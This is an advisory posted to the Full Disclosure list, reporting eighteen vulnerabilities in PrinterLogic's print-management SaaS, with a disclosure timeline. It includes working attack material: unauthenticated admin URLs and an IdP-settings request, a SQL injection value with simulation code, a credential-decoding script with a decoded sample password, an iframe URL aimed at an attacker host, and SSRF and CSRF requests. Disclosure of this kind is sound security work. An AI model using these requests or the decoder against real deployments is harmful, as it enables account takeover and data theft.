@@ -1,0 +1,535 @@
+
+Date: Thu, 25 May 2023 14:02:57 +1000
+From: Eldar Marcussen <wireghoul@...il.com>
+To: fulldisclosure@...lists.org
+Subject: [FD] Printerlogic multiple vulnerabilities
+
+PrinterLogic SaaS, multiple vulnerabilities
+===========================================================
+PrinterLogic's Enterprise Print Management software allows IT
+professionals to simplify printer driver management and empower end
+users.
+  -- https://www.printerlogic.com/
+
+
+Background
+----------------------------------
+The following findings were identified by performing both dynamic
+testing of the PrinterLogic SaaS platform and code analysis of the
+source code contained in the virtual appliance available for download
+from the PrinterLogic website (Build 1.0.757: July 29th, 2022).
+
+
+Credit
+-----------------------------------
+The vulnerabilities were discovered by Eldar Marcussen, Gareth
+Phillips, Jeff Thomas, Luke Symons, Nadeem Salim, Stephen Bradshaw,
+Tony Wu and Yianna Paris.
+
+
+OVE-20230524-0001 Authentication bypass
+===========================================================
+As the application is not using a central framework for handling
+authentication and authorization the individual PHP files must all
+implement authentication and authorization checks in a consistent same
+way. However, this is not the case and many of the administrative
+files are missing authentication checks completely, allowing
+unauthenticated access to administrative scripts via their direct
+URLs.
+
+For example:
+  * https://example.printercloud10.com/admin/query/reports.php?action=start_database_query&export=0&report_type=Overview+-+By+Week&sort_by=&sort_order=0&page=1&start_date=2023%2F01%2F11&stop_date=2023%2F01%2F11&start_time=12%3A00+AM&stop_time=11%3A59+PM&time_offset=39600&order=&user_name=&job_title=&computer_name=&manager_name=&department_name=&printer_name=&printer_type=printer_type_tcpip&job_type=job_type_scan&user_name_wildcard=*&company_name_wildcard=*&job_title_wildcard=*&manager_name_wildcard=*&department_name_wildcard=*&printer_name_wildcard=*&folder_path=Test&show_tcpip_printers=1&show_usb_printers=1&show_folder_accumulate=0
+
+  * https://example.printercloud10.com/admin/api/advanced-groups?limit=25
+
+It also appears possible for an unauthenticated attacker to alter the
+idp configuration of the SaaS service, however due to lack of
+integration this was not tested further, the following request
+contains no authentication or session details, but did receive a `{
+"message":"success"}` json response:
+```
+PUT /api/authn/save-idp-settings HTTP/2
+Host: example.printercloud10.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0)
+Gecko/20100101 Firefox/108.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Dnt: 1
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Te: trailers
+Content-Type: application/json
+Content-Length: 2
+
+{}
+```
+
+
+OVE-20230524-0002 SQL injection
+===========================================================
+Overall the application does not use parameterized queries when
+retrieving data, but rather uses a custom DAO framework which utilises
+several escaping functions that attempt to prevent SQL injection using
+various string handling functions. These are either custom functions -
+a practice that is not recommended, or rely on
+mysqli_real_escape_string(), which has a number of flaws, resulting in
+conditions where SQL injection is possible. For example, the following
+function that tries to avoid injection via the backtick character is
+flawed as it does not also handle escape sequences:
+
+```php
+public function escapeMySQLSchemaName($identifier) { return "`" .
+str_replace("`", "``", $identifier) . "`"; }
+```
+
+If an attacker supplied the string ```abc\`,injected``` then function
+would return ```abc\``,injected``` where the first backtick is escaped
+and the second terminates an existing backtick defined string.
+
+In some cases, input does not appear to be filtered or validated at
+all. For example, the offset parameter in the admin/query/reports.php
+script mentioned in the authentication bypass issue,
+We can simulate this by combining the functions from the different
+files as follows and see that the offset value is successfully
+injected, however due to how MySQL handles group by expressions it
+would be difficult to find an injection payload that doesn't break the
+SQL syntax and has a valid group by statement.
+
+```php
+// print_stat_dao.php gets called from overview_total_per_week()
+function per_week_columns($time_offset)  {
+    // Use UTC for the "WHERE" clause (since printed, $start and $stop
+are in UTC), but local time for everything else
+    $local_printed = "TIMESTAMPADD(SECOND, $time_offset, printed)";
+    return "WEEK($local_printed, 2) AS current_week,
+    YEAR($local_printed) AS current_year,
+    $local_printed AS local_printed
+    ";
+}
+
+function per_week_group_by($time_offset) {
+    $adjusted_printed = "TIMESTAMPADD(SECOND, $time_offset, printed)";
+    return "WEEK($adjusted_printed, 2)";
+}
+
+function per_week_order_by($time_offset) {
+    $adjusted_printed = "TIMESTAMPADD(SECOND, $time_offset, printed)";
+    return "YEAR($adjusted_printed), WEEK($adjusted_printed, 2)";
+}
+
+function per_year_group_by($time_offset) {
+    $adjusted_printed = "TIMESTAMPADD(SECOND, $time_offset, printed)";
+    return "YEAR($adjusted_printed)";
+}
+
+
+// print_stat_dao.php helper function
+// Date allows invalid data in time_offset
+// is_valid_date_time does not, but offset isn't used there (FTW!)
+function create_start_stop_dates($start_date, $start_time, $stop_date,
+$stop_time, $time_offset) {
+    // Convert dates to UTC
+    $start = $start_date . " " . $start_time;
+    $stop = $stop_date . " " . $stop_time;
+    if (!is_valid_date_time($start_date, $start_time)) {
+        echo "Invalid start date/time: $start";
+        return false;
+    }
+    if (!is_valid_date_time($stop_date, $stop_time)) {
+        echo "Invalid end date/time: $stop";
+        return false;
+    }
+    if (strtotime($start) > strtotime($stop)) {
+        echo "Start date/time is later than end date/time: $start > $stop";
+        return false;
+    }
+
+    $start = date("Y-m-d H:i:00", strtotime($start_date . " " .
+$start_time) - $time_offset);
+    $stop = date("Y-m-d H:i:59", strtotime($stop_date . " " .
+$stop_time) - $time_offset);
+    return array($start, $stop);
+}
+
+// Helper function requires specific formats for start/stop date/time
+function is_valid_date_time($date, $time)  {
+    $format = "Y/m/d h:i A";
+    $date = $date . " " . $time;
+    $current = DateTime::createFromFormat($format, $date);
+    if (!$current)
+        return false;
+    return $current && $current->format($format) == $date;
+}
+
+// Simulate user supplied data and flow for overview_total_per_week()
+in print_stat_dao.php
+// This gets called from ../../helpers/reports.php for the following
+report type:
+//    case "Overview - By Week":
+//        101             array_push($ids,
+//        102
+$print_stat_dao->overview_total_per_week($start_date, $start_time,
+$stop_date, $stop_time, $time_offset));
+$time_offset="600, injected)) -- ";
+$start_date="2021/01/01";
+$start_time="11:25 AM";
+$stop_date="2021/01/01";
+$stop_time="11:55 AM";
+
+$dates = create_start_stop_dates($start_date, $start_time, $stop_date,
+$stop_time, $time_offset);
+//var_dump($dates);
+$start = $dates[0];
+$stop = $dates[1];
+$per_week_columns = per_week_columns($time_offset);
+$per_year_group_by = per_year_group_by($time_offset);
+$per_week_group_by = per_week_group_by($time_offset);
+$per_week_order_by = per_week_order_by($time_offset);
+$permissions_filtered_print_stats_where_clause = "1=1";
+
+$query = "
+     SELECT
+         SUM(mono_duplex_count + mono_simplex_count +
+color_duplex_count + color_simplex_count) as total_pages,
+         SUM(mono_duplex_cost + mono_simplex_cost + color_duplex_cost
++ color_simplex_cost) AS total_cost,
+$per_week_columns
+FROM
+ppp_print_stats
+WHERE
+(printed BETWEEN '$start' AND '$stop') and (job_type <> 4) and
+($permissions_filtered_print_stats_where_clause)
+GROUP BY
+$per_year_group_by,
+$per_week_group_by
+ORDER BY
+$per_week_order_by";
+
+echo "$query\n;\n\n\n";
+```
+
+
+OVE-20230524-0003 Cross site scripting
+===========================================================
+Several instances of cross site scripting were identified in the application:
+  * https://example.printercloud10.com/admin/query/advanced_search.php
+(q parameter)
+  * https://example.printercloud10.com/app/app_requests.php (action parameter)
+  * https://example.printercloud10.com/generators/standalone_autodownload_applet.php
+(name parameter)
+
+These could be used to attack application users or hijack an
+administrative account by leaking the users session cookies via the
+/admin/cookies URL.
+
+
+OVE-20230524-0004 Session fixation
+===========================================================
+The /admin/query/verify-login.php script does not issue a new session
+identifier after login. An attacker could prime a known session id for
+a user via xss, a phishing or watering hole attack and then later
+access the application using the known session id to bypass
+authentication. The following scripts also appears to grant
+full/partial session control based on url parameters:
+
+  * Http/Api/Controllers/PrinterController.php:
+$sessionId = $request->input('sessionId');
+  * console_release/xerox/xerox_session.php:
+$xerox_session_vo->id = requestint('session', 0);
+  * console_release/xerox/xerox_session.php:
+$xerox_session_vo->session_id = requeststr('session_id', '');
+  * console_release/xerox/xerox_session.php:
+$xerox_session_vo->id = requestint('session', 0);
+  * state/query/console_release.php:    $_SESSION['toshibaSessionId']
+= requeststr('session_id', '');
+
+
+OVE-20230524-0005 Password in URL
+===========================================================
+It is possible to login as admin via:
+
+  * https://example.printercloud10.com/admin/query/verify_login.php?user=MHg1flFXUnRhVzUySDI5QUNsOFJLQlUwUUV0amNTWnlNVHRCS1NNK0dSRkZSVU5XQTNjZkRYa1JSeXRYWDJsQktnNVhkQTFUSGlackxRRkRKbEVHRE&password=MHgxNn5ORVZPVWxWaU0xQkRielJoYzFkcVYyOXdja1pCUlJONldrRmNhVjROUW5wSUh5STVaMUZERFdSZlJHTUNTUjVEY0VKZkx3SXhCRkF5SURaRU&credential_enc=true
+
+This could lead to passwords leaking to third parties via referrer
+headers, browser history, server logs, proxy logs, URL shortening
+services, etc. Although these passwords are encoded in the URL, they
+are trivial to decode to plaintext as evidenced elsewhere in the
+report
+
+
+OVE-20230524-0006 Plaintext passwords in logs
+===========================================================
+The application was found to log request data which may include
+passwords and, in some cases, explicitly log plaintext passwords. This
+includes, but is not limited to:
+
+  * /console_release/hp/install_popup_load.php
+```php
+$XRX_USERNAME = substr(base64_decode(requeststr('username', '')), 0, -30);
+$XRX_PASSWORD = Printer::unObfuscate(requeststr('password', ''));
+Log::debug('hp, 1.txt, ' . requeststr('username', '') . ', ' . $XRX_USERNAME
+    . ', ' . requeststr('password', '') . ', ' . $XRX_PASSWORD);
+```
+
+
+OVE-20230524-0007 Weak password encryption/encoding in use
+===========================================================
+The application appears to be storing passwords using unsalted sha1
+hashing, and transmitting authentication data using a custom double
+base64 encoding, as seen in the URL in password issue.
+
+lib/dao/user_dao.php line: 154
+```php
+  function make_user($username,$mypass,$first,$last,$type,$myco,$email) {
+        //this function is very similar to the automatically created
+new_XXX function of daos...
+        //I've converted your function just so you still have it.
+        $securepass = sha1($mypass);
+
+        $vo=new user_vo();
+            $vo->str_username=$username;
+            $vo->str_my_password=$securepass;
+            $vo->str_user_status="Active";
+            $vo->str_first_name=$first;
+            $vo->str_last_name=$last;
+            $vo->int_user_type=$type;
+            $vo->account_id=$myco;
+            $vo->str_email_address=$emai l;
+            return $this->new_user($vo);
+        }
+```
+
+The application uses a double base64 encoding to obfuscate usernames
+and passwords, with a length field to avoid reading padding data.
+However, they can easily be recovered with a simple script:
+
+```php
+function decodeCredentials($encodedStr)
+{
+     $firstDecode = base64_decode($encodedStr);
+     if (empty($firstDecode)) {
+         return '';
+     }//end if
+     $encodedParts = explode('~', $firstDecode);
+     if (count($encodedParts) < 2) {
+         return '';
+     }//end if
+
+     // length of the unencoded credential
+     $len = hexdec($encodedParts[0]);
+     $decodedCredential = base64_decode($encodedParts[1]);
+     if (empty($decodedCredential)) {
+         return '';
+     }//end if
+
+     //extract the unencoded credential from the padding
+     $credential = substr($decodedCredential, 0, $len);
+     return urldecode($credential);
+}
+
+// outputs 4ENRUb3PCo4asWjWoprFAE
+echo decodeCredentials("MHgxNn5ORVZPVWxWaU0xQkRielJoYzFkcVYyOXdja1pCUlJONldrRmNhVjROUW5wSUh5STVaMUZERFdSZlJHTUNTUjVEY0VKZkx3SXhCRkF5SURaRU");
+```
+
+OVE-20230524-0008 Insufficient CSRF protection
+===========================================================
+The application does not enforce CSRF checks for the majority of its
+forms, even for the requests that have a value present in a header,
+cookie or form, testing found that changing or removing the value had
+no actual impact on the success of the operation:
+
+```
+POST /admin/query/reports.php HTTP/2
+Host: example.printercloud10.com
+Cookie: PHPSESSID=ubbd04d1j65555mv2t8p07eqam;
+XSRF-TOKEN=eyJpdiI6IisrWTlaY0ZTWUJSRUlUWU5FLzJ5Rnc9PSIsInZhbHVlIjoiSHlybzZGME02NGFSRGVWcTlQVTA2amgxWmVtN3VESzVxVm1kUlZQcFd3N1gxa09CWW1xNE43elA2SDh4dlZKMk1MMHhEd1RDT0NJNGhIWWZ5SzkyUUQzd3oyS1ppQWc0dGdkb1V1a0M2NjRJcWR0TUpLMjI3a1JQS2MwVTVrclciLCJtYWMiOiJmNjQ3NmNkMzQyNDIzZDAyMWYxNWI3ZTZiMjRjMjdkMGFkOWRhMGYxODNhZWQ4NjIyMTY2ODk4ZmVmNDA3ZjE0IiwidGFnIjoiIn0%3D;
+laravel_session=eyJpdiI6Im9nS1poYmZXRmlXTHJyTDhHY3lxL1E9PSIsInZhbHVlIjoiMW1lZVN3a0lSYUlWNHFiWjJjWHMwZ1VtSXgzeWZqT3BsTVJXNEo1cHkvNVRmSE5MRFdyK3FuaFpOR3RBR0tJdDhLVjk3TGloc0h5YjNtcHgzNjEvMWl1WElxYmd3YTV2aDI3dTFSY1ZjaUx0ZXRJRFN0ZjRXbE81WisxK25WZC8iLCJtYWMiOiI5OGZlMGFkYmFmY2IxYjk3NWI3OGJkNzgyMjM5NjRmYzczYTdhMjVlYTU2Njg3MWIzOWJjNDM0YmRmYzExZmRiIiwidGFnIjoiIn0%3D
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0)
+Gecko/20100101 Firefox/108.0
+Accept: application/xml, text/xml, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Csrf-Token: THIS IS NOT A VALID TOKEN
+X-Requested-With: XMLHttpRequest
+Content-Length: 596
+Origin: https://example.printercloud10.com
+Dnt: 1
+Referer: https://example.printercloud10.com/admin/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+
+action=start_database_query&export=0&report_type=Overview+-+B%26W%2FColor&sort_by=&sort_order=&page=&start_date=2023/01/11&stop_date=2023/01/11&start_time=12%3A00+AM&stop_time=11%3A59+PM&time_offset=1&order=&user_name=&job_title=&computer_name=&manager_name=&department_name=&printer_name=&printer_type=printer_type_tcpip&job_type=job_type_scan&user_name_wildcard=*&company_name_wildcard=*&job_title_wildcard=*&manager_name_wildcard=*&department_name_wildcard=*&printer_name_wildcard=*&folder_path=Test&show_tcpip_printers=1&show_usb_printers=1&show_folder_accumulate=0
+```
+
+
+OVE-20230524-0009 Insufficient anti virus protection
+===========================================================
+Printer drivers are manually uploaded by admins and assigned to
+printers. The PrinterLogic application allows drivers containing known
+malicious code to be uploaded.
+
+
+OVE-20230524-0010 Insufficient authorization checks
+===========================================================
+While the application supports several user levels, most of the
+individual PHP scripts does not implement granular access control
+based on roles, but simply rely on an authentication check (if
+present) like this:
+```php
+if(!GLOBALS::$login->is_logged_in()) {
+    respond_expired();
+    die();
+}
+```
+This is distinctive from pages that implements a role based check,
+such as /admin/design/management_accountts_users.php
+```php
+$user_permissions = UserPermissions::create_for_current_user();
+$pagePermission =
+$user_permissions->get_options_value_general(Constant::ToolsMenuUsers);
+if (!$pagePermission) {
+    respond_html_failure(UserPermissions::INSUFFICIENT_PERMISSIONS_MESSAGE, "");
+    return;
+}
+```
+
+
+OVE-20230524-0011 Administrative user email enumeration
+===========================================================
+The forgot password function will confirm if an email address exists
+or not and can be used to enumerate users/emails.
+
+
+OVE-20230524-0012 Arbitrary content inclusion via iframe
+===========================================================
+The following URL will include an arbitrary URL in an iframe, this
+could be used to redirect the application using a frame busting
+technique, execute JavaScript or initiate file downloads from an
+untrusted source.
+
+  * https://example.printercloud10.com/generators/standalone_autodownload_applet.php?server=https://attackerurl&node_id=bbbb&file=ccccc&dialog=dddd&name=eeee&path=fffff
+
+
+OVE-20230524-0013 Remote network scanning (XSPA)/DoS
+===========================================================
+There are several php files that will initiate user-controlled
+connections to third party IP/port combinations over protocol such as
+LDAP, IMAP, SMTP, telnet, etc. Telnet scanning (and possibly others)
+runs until the connection closes so could lead to DoS condition by
+consuming all web server workers
+
+  * https://example.printercloud10.com/email/email_printing_test.php?test_type=CONNECTION&connection_type=IMAP
+  * https://example.printercloud10.com/admin/query/test_ldap_settings.php?action=test_connection_to_server&server=ldapsdns,.com&ldaps=0&ldap_port=8080
+  * https://example.printercloud10.com/console_release/fast_release/rfideas_241_install.php?printer_id=1&ip_address=lostworldsbbs.com
+
+
+OVE-20230524-0014 Insufficient signature validation
+===========================================================
+Printer drivers are manually uploaded by admins and assigned to
+printers. The PrinterLogic application allows drivers to be uploaded
+that are not cryptographically signed with valid certificates from a
+trusted authority.
+
+
+OVE-20230524-0015 Device impersonation
+===========================================================
+In at least one area of the PrinterLogic system, authorised devices
+are identified by machine name. It is possible to rename a host and
+have this impact another authorised devices records in at least one
+place.
+
+
+OVE-20230524-0016 Oauth security bypass
+===========================================================
+PrinterLogic clients need an authorization code to authenticate and
+being authorised devices. These are sent by the Printer Installer
+Client desktop application, which receives an access token as a
+response.
+This token is then used for all authenticated requests from the
+desktop application.
+When signing into the web application, there is an option to sign in
+as the Current User. This sends encrypted information to the server
+using the siddata parameter.
+As symmetric encryption is used, and the key is easily obtainable from
+the client-side applications, it is possible to decrypt, modify and
+re-encrypt this data.
+
+
+OVE-20230524-0017 Cookie returned in response body
+===========================================================
+The URL /admin/cookies returns the cookie values in the page body.
+This breaks the HTTPOnly cookie security control used to prevent
+JavaScript from accessing the cookie values during a session hijacking
+attack.
+
+
+OVE-20230524-0018 Known vulnerable components in use
+===========================================================
+The use of third-party JavaScript libraries can introduce a range of
+DOM-based vulnerabilities, including some that can be used to hijack
+user accounts like DOM-XSS.
+
+4 instances of this issue were identified, at the following locations:
+  * /admin/map_bg/map_upload_bg.php
+  * /assets/scripts/common-bb625e26df.js
+  * /assets/scripts/common-fcc1983a7e.js
+  * /assets/scripts/jquery-40c7c38831.form.js
+
+
+Timeline
+===========================================================
+2023-02-01 - Vulnerability details shared with CERT/CC
+2023-02-09 - CERT/CC reached out to vendor
+2023-02-10 - Reached out to vendor directly advicing them of the
+CERT/CC submission
+2023-03-14 - Vendor responded
+2023-03-14 - Updated CERT/CC on vendors response
+2023-02-14 - CERT/CC reached out to vendor again
+2023-02-15 - Responded to vendor, again directing them to CERT/CC for
+vulnerability details and disclosure coordination
+2023-02-17 - Vendor responded
+2023-02-17 - Responded to vendor, again directing them to CERT/CC for
+vulnerability details and disclosure coordination
+2023-03-17 - Updated CERT/CC on vendors response
+2023-03-28 - Requested status update from CERT/CC
+2023-04-06 - Requested status update from CERT/CC
+2023-04-06 - CERT/CC adviced vendor has responded to emails, but not
+joined the VINCE platform
+2023-04-11 - Reached out to vendor directly on behalf of CERT/CC
+2023-04-11 - Vendor responded
+2023-04-14 - Requested update from CERT/CC
+2023-04-21 - Vendor joins VINCE
+2023-04-21 - Vendor requests extension to disclosure timeline
+2023-04-22 - Vendor advices they cannot locate the vulnerability details
+2023-04-25 - Offer vendor 30 day timeline extention, provide copy of
+draft advisory and request CVE identifiers from CERT/CC
+2023-04-26 - CERT/CC confirms vulnerability details availability to
+vendor, advices to request CVEs directly from MITRE
+2023-04-26 - Vendor confirms receipt of vulnerability details
+2023-04-27 - Submit CVE request to MITRE
+2023-05-09 - Vendor shares vulnerability details with their product team
+2023-05-17 - Request update from MITRE
+2023-05-18 - Advice vendor and CERT/CC that advisory will use OVE
+identifiers if CVE identifiers have not been issued prior to
+disclosure
+2023-05-18 - Vendor request additional disclosure delay in order to
+triage issues
+2023-05-24 - Vendor request additional disclosure delay in order to
+triage issues
+2023-05-24 - Vendor disputes issues OVE-2023240006 (legacy code),
+OVE-2023240008 (legacy code), OVE-2023240010 (researchers didn't
+specify all the places this needs to be fixed), OVE-2023240014 (won't
+fix).
+2023-05-25 - Public disclosure
+????-??-?? - Patch available
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: https://seclists.org/fulldisclosure/
